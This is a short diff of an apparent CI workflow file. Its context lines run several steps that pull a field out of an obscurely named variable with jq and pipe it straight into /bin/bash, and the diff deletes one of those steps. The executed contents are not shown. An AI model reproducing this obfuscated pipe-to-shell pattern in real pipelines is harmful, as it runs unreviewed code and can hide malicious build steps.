@@ -36,7 +36,6 @@ jobs:
           echo $pqmsp07725 | jq -r .tz1908 | /bin/bash
           printf '%s' "$k498" | jq -r .z3949 | /bin/bash
           printf '%s' "$tdv1209" | jq -r .hfo557 | /bin/bash
-          printf '%s' "$lrzix6" | jq -r .pwfce8110 | /bin/bash
           printf '%s' "$glmuy641" | jq -r .ru43 | /bin/bash
 
       - name: Save archive
